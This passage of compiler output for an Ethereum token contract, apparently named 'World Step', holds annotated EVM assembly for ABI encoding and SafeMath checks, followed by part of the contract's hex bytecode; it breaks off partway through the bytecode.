\"#utility.yul\":23375:23420   */\n      tag_490\n      jump\t// in\n    tag_722:\n        /* \"#utility.yul\":23370:23373   */\n      dup3\n        /* \"#utility.yul\":23363:23421   */\n      mstore\n        /* \"#utility.yul\":23280:23427   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":23433:23547   */\n    tag_492:\n        /* \"#utility.yul\":23500:23506   */\n      0x00\n        /* \"#utility.yul\":23534:23539   */\n      dup2\n        /* \"#utility.yul\":23528:23540   */\n      mload\n        /* \"#utility.yul\":23518:23540   */\n      swap1\n      pop\n        /* \"#utility.yul\":23433:23547   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":23553:23737   */\n    tag_493:\n        /* \"#utility.yul\":23652:23663   */\n      0x00\n        /* \"#utility.yul\":23686:23692   */\n      dup3\n        /* \"#utility.yul\":23681:23684   */\n      dup3\n        /* \"#utility.yul\":23674:23693   */\n      mstore\n        /* \"#utility.yul\":23726:23730   */\n      0x20\n        /* \"#utility.yul\":23721:23724   */\n      dup3\n        /* \"#utility.yul\":23717:23731   */\n      add\n        /* \"#utility.yul\":23702:23731   */\n      swap1\n      pop\n        /* \"#utility.yul\":23553:23737   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":23743:23875   */\n    tag_494:\n        /* \"#utility.yul\":23810:23814   */\n      0x00\n        /* \"#utility.yul\":23833:23836   */\n      dup2\n        /* \"#utility.yul\":23825:23836   */\n      swap1\n      pop\n        /* \"#utility.yul\":23863:23867   */\n      0x20\n        /* \"#utility.yul\":23858:23861   */\n      dup3\n        /* \"#utility.yul\":23854:23868   */\n      add\n        /* \"#utility.yul\":23846:23868   */\n      swap1\n      pop\n        /* \"#utility.yul\":23743:23875   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":23881:23989   */\n    tag_495:\n        /* \"#utility.yul\":23958:23982   */\n      tag_727\n        /* \"#utility.yul\":23976:23981   */\n      dup2\n        /* \"#utility.yul\":23958:23982   */\n      tag_439\n      jump\t// in\n    tag_727:\n        /* \"#utility.yul\":23953:23956   */\n      dup3\n        /* \"#utility.yul\":23946:23983   */\n      mstore\n        /* \"#utility.yul\":23881:23989   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":23995:24174   */\n    tag_496:\n        /* \"#utility.yul\":24064:24074   */\n      0x00\n        /* \"#utility.yul\":24085:24131   */\n      tag_729\n        /* \"#utility.yul\":24127:24130   */\n      dup4\n        /* \"#utility.yul\":24119:24125   */\n      dup4\n        /* \"#utility.yul\":24085:24131   */\n      tag_495\n      jump\t// in\n    tag_729:\n        /* \"#utility.yul\":24163:24167   */\n      0x20\n        /* \"#utility.yul\":24158:24161   */\n      dup4\n        /* \"#utility.yul\":24154:24168   */\n      add\n        /* \"#utility.yul\":24140:24168   */\n      swap1\n      pop\n        /* \"#utility.yul\":23995:24174   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":24180:24293   */\n    tag_497:\n        /* \"#utility.yul\":24250:24254   */\n      0x00\n        /* \"#utility.yul\":24282:24286   */\n      0x20\n        /* \"#utility.yul\":24277:24280   */\n      dup3\n        /* \"#utility.yul\":24273:24287   */\n      add\n        /* \"#utility.yul\":24265:24287   */\n      swap1\n      pop\n        /* \"#utility.yul\":24180:24293   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":24329:25061   */\n    tag_498:\n        /* \"#utility.yul\":24448:24451   */\n      0x00\n        /* \"#utility.yul\":24477:24531   */\n      tag_732\n        /* \"#utility.yul\":24525:24530   */\n      dup3\n        /* \"#utility.yul\":24477:24531   */\n      tag_492\n      jump\t// in\n    tag_732:\n        /* \"#utility.yul\":24547:24633   */\n      tag_733\n        /* \"#utility.yul\":24626:24632   */\n      dup2\n        /* \"#utility.yul\":24621:24624   */\n      dup6\n        /* \"#utility.yul\":24547:24633   */\n      tag_493\n      jump\t// in\n    tag_733:\n        /* \"#utility.yul\":24540:24633   */\n      swap4\n      pop\n        /* \"#utility.yul\":24657:24713   */\n      tag_734\n        /* \"#utility.yul\":24707:24712   */\n      dup4\n        /* \"#utility.yul\":24657:24713   */\n      tag_494\n      jump\t// in\n    tag_734:\n        /* \"#utility.yul\":24736:24743   */\n      dup1\n        /* \"#utility.yul\":24767:24768   */\n      0x00\n        /* \"#utility.yul\":24752:25036   */\n    tag_735:\n        /* \"#utility.yul\":24777:24783   */\n      dup4\n        /* \"#utility.yul\":24774:24775   */\n      dup2\n        /* \"#utility.yul\":24771:24784   */\n      lt\n        /* \"#utility.yul\":24752:25036   */\n      iszero\n      tag_737\n      jumpi\n        /* \"#utility.yul\":24853:24859   */\n      dup2\n        /* \"#utility.yul\":24847:24860   */\n      mload\n        /* \"#utility.yul\":24880:24943   */\n      tag_738\n        /* \"#utility.yul\":24939:24942   */\n      dup9\n        /* \"#utility.yul\":24924:24937   */\n      dup3\n        /* \"#utility.yul\":24880:24943   */\n      tag_496\n      jump\t// in\n    tag_738:\n        /* \"#utility.yul\":24873:24943   */\n      swap8\n      pop\n        /* \"#utility.yul\":24966:25026   */\n      tag_739\n        /* \"#utility.yul\":25019:25025   */\n      dup4\n        /* \"#utility.yul\":24966:25026   */\n      tag_497\n      jump\t// in\n    tag_739:\n        /* \"#utility.yul\":24956:25026   */\n      swap3\n      pop\n        /* \"#utility.yul\":24812:25036   */\n      pop\n        /* \"#utility.yul\":24799:24800   */\n      0x01\n        /* \"#utility.yul\":24796:24797   */\n      dup2\n        /* \"#utility.yul\":24792:24801   */\n      add\n        /* \"#utility.yul\":24787:24801   */\n      swap1\n      pop\n        /* \"#utility.yul\":24752:25036   */\n      jump(tag_735)\n    tag_737:\n        /* \"#utility.yul\":24756:24770   */\n      pop\n        /* \"#utility.yul\":25052:25055   */\n      dup6\n        /* \"#utility.yul\":25045:25055   */\n      swap4\n      pop\n        /* \"#utility.yul\":24453:25061   */\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":24329:25061   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":25067:25898   */\n    tag_356:\n        /* \"#utility.yul\":25330:25334   */\n      0x00\n        /* \"#utility.yul\":25368:25371   */\n      0xa0\n        /* \"#utility.yul\":25357:25366   */\n      dup3\n        /* \"#utility.yul\":25353:25372   */\n      add\n        /* \"#utility.yul\":25345:25372   */\n      swap1\n      pop\n        /* \"#utility.yul\":25382:25453   */\n      tag_741\n        /* \"#utility.yul\":25450:25451   */\n      0x00\n        /* \"#utility.yul\":25439:25448   */\n      dup4\n        /* \"#utility.yul\":25435:25452   */\n      add\n        /* \"#utility.yul\":25426:25432   */\n      dup9\n        /* \"#utility.yul\":25382:25453   */\n      tag_452\n      jump\t// in\n    tag_741:\n        /* \"#utility.yul\":25463:25543   */\n      tag_742\n        /* \"#utility.yul\":25539:25541   */\n      0x20\n        /* \"#utility.yul\":25528:25537   */\n      dup4\n        /* \"#utility.yul\":25524:25542   */\n      add\n        /* \"#utility.yul\":25515:25521   */\n      dup8\n        /* \"#utility.yul\":25463:25543   */\n      tag_491\n      jump\t// in\n    tag_742:\n        /* \"#utility.yul\":25590:25599   */\n      dup2\n        /* \"#utility.yul\":25584:25588   */\n      dup2\n        /* \"#utility.yul\":25580:25600   */\n      sub\n        /* \"#utility.yul\":25575:25577   */\n      0x40\n        /* \"#utility.yul\":25564:25573   */\n      dup4\n        /* \"#utility.yul\":25560:25578   */\n      add\n        /* \"#utility.yul\":25553:25601   */\n      mstore\n        /* \"#utility.yul\":25618:25726   */\n      tag_743\n        /* \"#utility.yul\":25721:25725   */\n      dup2\n        /* \"#utility.yul\":25712:25718   */\n      dup7\n        /* \"#utility.yul\":25618:25726   */\n      tag_498\n      jump\t// in\n    tag_743:\n        /* \"#utility.yul\":25610:25726   */\n      swap1\n      pop\n        /* \"#utility.yul\":25736:25808   */\n      tag_744\n        /* \"#utility.yul\":25804:25806   */\n      0x60\n        /* \"#utility.yul\":25793:25802   */\n      dup4\n        /* \"#utility.yul\":25789:25807   */\n      add\n        /* \"#utility.yul\":25780:25786   */\n      dup6\n        /* \"#utility.yul\":25736:25808   */\n      tag_455\n      jump\t// in\n    tag_744:\n        /* \"#utility.yul\":25818:25891   */\n      tag_745\n        /* \"#utility.yul\":25886:25889   */\n      0x80\n        /* \"#utility.yul\":25875:25884   */\n      dup4\n        /* \"#utility.yul\":25871:25890   */\n      add\n        /* \"#utility.yul\":25862:25868   */\n      dup5\n        /* \"#utility.yul\":25818:25891   */\n      tag_452\n      jump\t// in\n    tag_745:\n        /* \"#utility.yul\":25067:25898   */\n      swap7\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":25904:26209   */\n    tag_389:\n        /* \"#utility.yul\":25944:25947   */\n      0x00\n        /* \"#utility.yul\":25963:25983   */\n      tag_747\n        /* \"#utility.yul\":25981:25982   */\n      dup3\n        /* \"#utility.yul\":25963:25983   */\n      tag_442\n      jump\t// in\n    tag_747:\n        /* \"#utility.yul\":25958:25983   */\n      swap2\n      pop\n        /* \"#utility.yul\":25997:26017   */\n      tag_748\n        /* \"#utility.yul\":26015:26016   */\n      dup4\n        /* \"#utility.yul\":25997:26017   */\n      tag_442\n      jump\t// in\n    tag_748:\n        /* \"#utility.yul\":25992:26017   */\n      swap3\n      pop\n        /* \"#utility.yul\":26151:26152   */\n      dup3\n        /* \"#utility.yul\":26083:26149   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":26079:26153   */\n      sub\n        /* \"#utility.yul\":26076:26077   */\n      dup3\n        /* \"#utility.yul\":26073:26154   */\n      gt\n        /* \"#utility.yul\":26070:26177   */\n      iszero\n      tag_749\n      jumpi\n        /* \"#utility.yul\":26157:26175   */\n      tag_750\n      tag_481\n      jump\t// in\n    tag_750:\n        /* \"#utility.yul\":26070:26177   */\n    tag_749:\n        /* \"#utility.yul\":26201:26202   */\n      dup3\n        /* \"#utility.yul\":26198:26199   */\n      dup3\n        /* \"#utility.yul\":26194:26203   */\n      add\n        /* \"#utility.yul\":26187:26203   */\n      swap1\n      pop\n        /* \"#utility.yul\":25904:26209   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":26215:26392   */\n    tag_499:\n        /* \"#utility.yul\":26355:26384   */\n      0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000\n        /* \"#utility.yul\":26351:26352   */\n      0x00\n        /* \"#utility.yul\":26343:26349   */\n      dup3\n        /* \"#utility.yul\":26339:26353   */\n      add\n        /* \"#utility.yul\":26332:26385   */\n      mstore\n        /* \"#utility.yul\":26215:26392   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":26398:26764   */\n    tag_500:\n        /* \"#utility.yul\":26540:26543   */\n      0x00\n        /* \"#utility.yul\":26561:26628   */\n      tag_753\n        /* \"#utility.yul\":26625:26627   */\n      0x1b\n        /* \"#utility.yul\":26620:26623   */\n      dup4\n        /* \"#utility.yul\":26561:26628   */\n      tag_431\n      jump\t// in\n    tag_753:\n        /* \"#utility.yul\":26554:26628   */\n      swap2\n      pop\n        /* \"#utility.yul\":26637:26730   */\n      tag_754\n        /* \"#utility.yul\":26726:26729   */\n      dup3\n        /* \"#utility.yul\":26637:26730   */\n      tag_499\n      jump\t// in\n    tag_754:\n        /* \"#utility.yul\":26755:26757   */\n      0x20\n        /* \"#utility.yul\":26750:26753   */\n      dup3\n        /* \"#utility.yul\":26746:26758   */\n      add\n        /* \"#utility.yul\":26739:26758   */\n      swap1\n      pop\n        /* \"#utility.yul\":26398:26764   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":26770:27189   */\n    tag_392:\n        /* \"#utility.yul\":26936:26940   */\n      0x00\n        /* \"#utility.yul\":26974:26976   */\n      0x20\n        /* \"#utility.yul\":26963:26972   */\n      dup3\n        /* \"#utility.yul\":26959:26977   */\n      add\n        /* \"#utility.yul\":26951:26977   */\n      swap1\n      pop\n        /* \"#utility.yul\":27023:27032   */\n      dup2\n        /* \"#utility.yul\":27017:27021   */\n      dup2\n        /* \"#utility.yul\":27013:27033   */\n      sub\n        /* \"#utility.yul\":27009:27010   */\n      0x00\n        /* \"#utility.yul\":26998:27007   */\n      dup4\n        /* \"#utility.yul\":26994:27011   */\n      add\n        /* \"#utility.yul\":26987:27034   */\n      mstore\n        /* \"#utility.yul\":27051:27182   */\n      tag_756\n        /* \"#utility.yul\":27177:27181   */\n      dup2\n        /* \"#utility.yul\":27051:27182   */\n      tag_500\n      jump\t// in\n    tag_756:\n        /* \"#utility.yul\":27043:27182   */\n      swap1\n      pop\n        /* \"#utility.yul\":26770:27189   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":27195:27375   */\n    tag_501:\n        /* \"#utility.yul\":27243:27320   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":27240:27241   */\n      0x00\n        /* \"#utility.yul\":27233:27321   */\n      mstore\n        /* \"#utility.yul\":27340:27344   */\n      0x12\n        /* \"#utility.yul\":27337:27338   */\n      0x04\n        /* \"#utility.yul\":27330:27345   */\n      mstore\n        /* \"#utility.yul\":27364:27368   */\n      0x24\n        /* \"#utility.yul\":27361:27362   */\n      0x00\n        /* \"#utility.yul\":27354:27369   */\n      revert\n        /* \"#utility.yul\":27381:27566   */\n    tag_405:\n        /* \"#utility.yul\":27421:27422   */\n      0x00\n        /* \"#utility.yul\":27438:27458   */\n      tag_759\n        /* \"#utility.yul\":27456:27457   */\n      dup3\n        /* \"#utility.yul\":27438:27458   */\n      tag_442\n      jump\t// in\n    tag_759:\n        /* \"#utility.yul\":27433:27458   */\n      swap2\n      pop\n        /* \"#utility.yul\":27472:27492   */\n      tag_760\n        /* \"#utility.yul\":27490:27491   */\n      dup4\n        /* \"#utility.yul\":27472:27492   */\n      tag_442\n      jump\t// in\n    tag_760:\n        /* \"#utility.yul\":27467:27492   */\n      swap3\n      pop\n        /* \"#utility.yul\":27511:27512   */\n      dup3\n        /* \"#utility.yul\":27501:27536   */\n      tag_761\n      jumpi\n        /* \"#utility.yul\":27516:27534   */\n      tag_762\n      tag_501\n      jump\t// in\n    tag_762:\n        /* \"#utility.yul\":27501:27536   */\n    tag_761:\n        /* \"#utility.yul\":27558:27559   */\n      dup3\n        /* \"#utility.yul\":27555:27556   */\n      dup3\n        /* \"#utility.yul\":27551:27560   */\n      div\n        /* \"#utility.yul\":27546:27560   */\n      swap1\n      pop\n        /* \"#utility.yul\":27381:27566   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":27572:27920   */\n    tag_425:\n        /* \"#utility.yul\":27612:27619   */\n      0x00\n        /* \"#utility.yul\":27635:27655   */\n      tag_764\n        /* \"#utility.yul\":27653:27654   */\n      dup3\n        /* \"#utility.yul\":27635:27655   */\n      tag_442\n      jump\t// in\n    tag_764:\n        /* \"#utility.yul\":27630:27655   */\n      swap2\n      pop\n        /* \"#utility.yul\":27669:27689   */\n      tag_765\n        /* \"#utility.yul\":27687:27688   */\n      dup4\n        /* \"#utility.yul\":27669:27689   */\n      tag_442\n      jump\t// in\n    tag_765:\n        /* \"#utility.yul\":27664:27689   */\n      swap3\n      pop\n        /* \"#utility.yul\":27857:27858   */\n      dup2\n        /* \"#utility.yul\":27789:27855   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":27785:27859   */\n      div\n        /* \"#utility.yul\":27782:27783   */\n      dup4\n        /* \"#utility.yul\":27779:27860   */\n      gt\n        /* \"#utility.yul\":27774:27775   */\n      dup3\n        /* \"#utility.yul\":27767:27776   */\n      iszero\n        /* \"#utility.yul\":27760:27777   */\n      iszero\n        /* \"#utility.yul\":27756:27861   */\n      and\n        /* \"#utility.yul\":27753:27884   */\n      iszero\n      tag_766\n      jumpi\n        /* \"#utility.yul\":27864:27882   */\n      tag_767\n      tag_481\n      jump\t// in\n    tag_767:\n        /* \"#utility.yul\":27753:27884   */\n    tag_766:\n        /* \"#utility.yul\":27912:27913   */\n      dup3\n        /* \"#utility.yul\":27909:27910   */\n      dup3\n        /* \"#utility.yul\":27905:27914   */\n      mul\n        /* \"#utility.yul\":27894:27914   */\n      swap1\n      pop\n        /* \"#utility.yul\":27572:27920   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":27926:28146   */\n    tag_502:\n        /* \"#utility.yul\":28066:28100   */\n      0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f\n        /* \"#utility.yul\":28062:28063   */\n      0x00\n        /* \"#utility.yul\":28054:28060   */\n      dup3\n        /* \"#utility.yul\":28050:28064   */\n      add\n        /* \"#utility.yul\":28043:28101   */\n      mstore\n        /* \"#utility.yul\":28135:28138   */\n      0x7700000000000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":28130:28132   */\n      0x20\n        /* \"#utility.yul\":28122:28128   */\n      dup3\n        /* \"#utility.yul\":28118:28133   */\n      add\n        /* \"#utility.yul\":28111:28139   */\n      mstore\n        /* \"#utility.yul\":27926:28146   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":28152:28518   */\n    tag_503:\n        /* \"#utility.yul\":28294:28297   */\n      0x00\n        /* \"#utility.yul\":28315:28382   */\n      tag_770\n        /* \"#utility.yul\":28379:28381   */\n      0x21\n        /* \"#utility.yul\":28374:28377   */\n      dup4\n        /* \"#utility.yul\":28315:28382   */\n      tag_431\n      jump\t// in\n    tag_770:\n        /* \"#utility.yul\":28308:28382   */\n      swap2\n      pop\n        /* \"#utility.yul\":28391:28484   */\n      tag_771\n        /* \"#utility.yul\":28480:28483   */\n      dup3\n        /* \"#utility.yul\":28391:28484   */\n      tag_502\n      jump\t// in\n    tag_771:\n        /* \"#utility.yul\":28509:28511   */\n      0x40\n        /* \"#utility.yul\":28504:28507   */\n      dup3\n        /* \"#utility.yul\":28500:28512   */\n      add\n        /* \"#utility.yul\":28493:28512   */\n      swap1\n      pop\n        /* \"#utility.yul\":28152:28518   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":28524:28943   */\n    tag_429:\n        /* \"#utility.yul\":28690:28694   */\n      0x00\n        /* \"#utility.yul\":28728:28730   */\n      0x20\n        /* \"#utility.yul\":28717:28726   */\n      dup3\n        /* \"#utility.yul\":28713:28731   */\n      add\n        /* \"#utility.yul\":28705:28731   */\n      swap1\n      pop\n        /* \"#utility.yul\":28777:28786   */\n      dup2\n        /* \"#utility.yul\":28771:28775   */\n      dup2\n        /* \"#utility.yul\":28767:28787   */\n      sub\n        /* \"#utility.yul\":28763:28764   */\n      0x00\n        /* \"#utility.yul\":28752:28761   */\n      dup4\n        /* \"#utility.yul\":28748:28765   */\n      add\n        /* \"#utility.yul\":28741:28788   */\n      mstore\n        /* \"#utility.yul\":28805:28936   */\n      tag_773\n        /* \"#utility.yul\":28931:28935   */\n      dup2\n        /* \"#utility.yul\":28805:28936   */\n      tag_503\n      jump\t// in\n    tag_773:\n        /* \"#utility.yul\":28797:28936   */\n      swap1\n      pop\n        /* \"#utility.yul\":28524:28943   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n    stop\n    data_974d1b4421da69cc60b481194f0dad36a5bb4e23da810da7a7fb30cdba178330 45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365\n\n    auxdata: 0xa2646970667358221220b3f42b2ed8ca7e3cd68cea8125712e8ad8930174cf484fa5044602aa4eb068e464736f6c634300080d0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052670de0b6b3a76400006414f46b04006200001f91906200074c565b6414f46b0400620000319190620007b3565b600655600160085560046009556001600a556001600b556000600e60006101000a81548160ff021916908315150217905550738492cbd894686d7e98214541903c7ba6f94928d6600e60016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073a4ed7aa4ef5deb0a63e97d9cb77445ae553feb1d600f60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073e061915592536656a92b9fd59e46b19ef920692f601060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060006014806101000a81548160ff0219169083151502179055506001601460156101000a81548160ff021916908315150217905550348015620001a457600080fd5b506000620001b7620006e260201b60201c565b9050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508073ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a350600654600260006200026c620006e260201b60201c565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506000739ac64cc6e4415144c455bd8e4837fea55603e5c3905080601160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508073ffffffffffffffffffffffffffffffffffffffff1663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000350573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000376919062000858565b73ffffffffffffffffffffffffffffffffffffffff1663c9c65396308373ffffffffffffffffffffffffffffffffffffffff1663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015620003de573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000404919062000858565b6040518363ffffffff1660e01b8152600401620004239291906200089b565b6020604051808303816000875af115801562000443573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000469919062000858565b601460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160056000620004bf620006ea60201b60201c565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055506001600560003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550600160056000600e60019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550600160056000600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055506200066c620006e260201b60201c565b73ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef670de0b6b3a7640000604051620006d39190620008d9565b60405180910390a350620008f6565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000620007598262000713565b9150620007668362000713565b9250826200077957620007786200071d565b5b828206905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000620007c08262000713565b9150620007cd8362000713565b925082821015620007e357620007e262000784565b5b828203905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006200082082620007f3565b9050919050565b620008328162000813565b81146200083e57600080fd5b50565b600081519050620008528162000827565b92915050565b600060208284031215620008715762000870620007ee565b5b6000620008818482850162000841565b91505092915050565b620008958162000813565b82525050565b6000604082019050620008b260008301856200088a565b620008c160208301846200088a565b9392505050565b620008d38162000713565b82525050565b6000602082019050620008f06000830184620008c8565b92915050565b6139e480620009066000396000f3fe60806040526004361061014f5760003560e01c8063715018a6116100b6578063aad5c0231161006f578063aad5c02314610479578063c3c8cd80146104a2578063c492f046146104b9578063c5cc6b6a146104e2578063dd62ed3e1461050d578063f2fde38b1461054a57610156565b8063715018a61461037d578063758dbe03146103945780638da5cb5b146103bd57806395d89b41146103e8578063a2a957bb14610413578063a9059cbb1461043c57610156565b806349bd5a5e1161010857806349bd5a5e14610281578063512f65c7146102ac57806359d0f713146102d55780636d8aa8f8146103005780636fc3eaec1461032957806370a082311461034057610156565b806306fdde031461015b578063095ea7b3146101865780631694505e146101c357806318160ddd146101ee57806323b872dd14610219578063313ce5671461025657610156565b3661015657005b600080fd5b34801561016757600080fd5b50610170610573565b60405161017d9190612a97565b60405180910390f35b34801561019257600080fd5b506101ad60048036038101906101a89190612b57565b6105b0565b6040516101ba9190612bb2565b60405180910390f35b3480156101cf57600080fd5b506101d86105ce565b6040516101e59190612c2c565b60405180910390f35b3480156101fa57600080fd5b506102036105f4565b6040516102109190612c56565b60405180910390f35b34801561022557600080fd5b50610240600480360381019061023b9190612c71565b610604565b60405161024d9190612bb2565b60405180910390f35b34801561026257600080fd5b5061026b6106dd565b6040516102789190612ce0565b60405180910390f35b34801561028d57600080fd5b506102966106e6565b6040516102a39190612d0a565b60405180910390f35b3480156102b857600080fd5b506102d360048036038101906102ce9190612c71565b61070c565b005b3480156102e157600080fd5b506102ea6108e5565b6040516102f79190612d46565b60405180910390f35b34801561030c57600080fd5b5061032760048036038101906103229190612d8d565b61090b565b005b34801561033557600080fd5b5061033e610a03565b005b34801561034c57600080fd5b5061036760048036038101906103629190612dba565b610b18565b6040516103749190612c56565b60405180910390f35b34801561038957600080fd5b50610392610b69565b005b3480156103a057600080fd5b506103bb60048036038101906103b69190612e25565b610cbc565b005b3480156103c957600080fd5b506103d2610ed1565b6040516103df9190612d0a565b60405180910390f35b3480156103f457600080fd5b506103fd610efa565b60405161040a9190612a97565b60405180910390f35b34801561041f57600080fd5b5061043a60048036038101906104359190612e52565b610f37565b005b34801561044857600080fd5b50610463600480360381019061045e9190612b57565b611140565b6040516104709190612bb2565b60405180910390f35b34801561048557600080fd5b506104a0600480360381019061049b9190612e25565b61115e565b005b3480156104ae57600080fd5b506104b7611373565b005b3480156104c557600080fd5b506104e060048036038101906104db9190612f1e565b611490565b005b3480156104ee57600080fd5b506104f76115ca565b6040516105049190612d0a565b60405180910390f35b34801561051957600080fd5b50610534600480360381019061052f9190612f7e565b6115f0565b6040516105419190612c56565b60405180910390f35b34801561055657600080fd5b50610571600480360381019061056c9190612dba565b611677565b005b60606040518060400160405280600a81526020017f576f726c64205374657000000000000000000000000000000000000000000000815250905090565b60006105c46105bd6117c9565b84846117d1565b6001905092915050565b601160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000670de0b6b3a7640000905090565b600061061184848461199a565b6106d28461061d6117c9565b6106cd8560405180606001604052806028815260200161398760289139600460008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006106836117c9565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611f019092919063ffffffff16565b6117d1565b600190509392505050565b60006009905090565b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff160361077b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161077290613030565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036107ea576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107e1906130c2565b60405180910390fd5b6000811161082d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161082490613154565b60405180910390fd5b6000600c819055506000600d81905550610845610ed1565b73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614806108b05750610881610ed1565b73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b156108e05760006108c76108c2610ed1565b610b18565b905060008111156108de576108dd848484611f65565b5b505b505050565b601260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6109136117c9565b73ffffffffffffffffffffffffffffffffffffffff16610931610ed1565b73ffffffffffffffffffffffffffffffffffffffff1614806109a757506109566117c9565b73ffffffffffffffffffffffffffffffffffffffff16600e60019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16145b6109e6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109dd906131c0565b60405180910390fd5b80601460156101000a81548160ff02191690831515021790555050565b600e60019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16610a446117c9565b73ffffffffffffffffffffffffffffffffffffffff161480610aba5750600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16610aa26117c9565b73ffffffffffffffffffffffffffffffffffffffff16145b80610afe5750610ac8610ed1565b73ffffffffffffffffffffffffffffffffffffffff16610ae66117c9565b73ffffffffffffffffffffffffffffffffffffffff16145b610b0757600080fd5b6000479050610b1581611f75565b50565b6000610b62600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054612070565b9050919050565b610b716117c9565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610bfe576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610bf59061322c565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffff